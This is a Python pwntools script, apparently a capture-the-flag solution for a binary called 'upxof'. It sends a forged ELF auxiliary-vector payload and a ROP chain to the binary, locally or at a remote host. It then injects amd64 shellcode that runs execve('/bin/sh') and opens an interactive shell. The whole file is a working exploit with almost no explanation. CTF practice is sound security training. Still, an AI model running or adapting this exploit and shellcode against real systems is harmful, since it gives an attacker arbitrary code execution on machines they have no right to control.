#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./upxof"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

f=[
    "12345678"+"\x00"*0x70,
    p64(1),
    p64(0x400001),
    p64(0),
    p64(0x400001),
    p64(0),
    # aux vector
    p64(0x17)+p64(0),
    p64(0x10)+p64(0x1f8bfbff),
    p64(0x11)+p64(0x64),
    p64(0x19)+p64(0x400098),# random 16 byte address
    p64(3)+p64(0x400040),
    p64(6)+p64(0x1000),
    p64(4)+p64(0x38),
    p64(5)+p64(2),
    p64(7)+p64(0),
    p64(8)+p64(0),
    p64(9)+p64(0x400988),
    p64(0xb)+p64(0x3e8),
    p64(0xc)+p64(0x3e8),
    p64(0xd)+p64(0x3e8),
    p64(0xe)+p64(0x3e8),
    p64(0)+p64(0)
]
conn.sendlineafter("password:",flat(f))

f={
    0x418:p64(0x4007EA)+p64(0)+p64(1)+p64(0x601030)+p64(0)+p64(0)+p64(0x601a00)+p64(0x4007D0)+\
            p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x601a00),
}
conn.sendlineafter("let's go:",fit(f,filler="\x00"))
shellcode="""
    mov rax,0x3b
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    syscall
"""
conn.sendline(asm(shellcode,arch="amd64"))
conn.interactive()
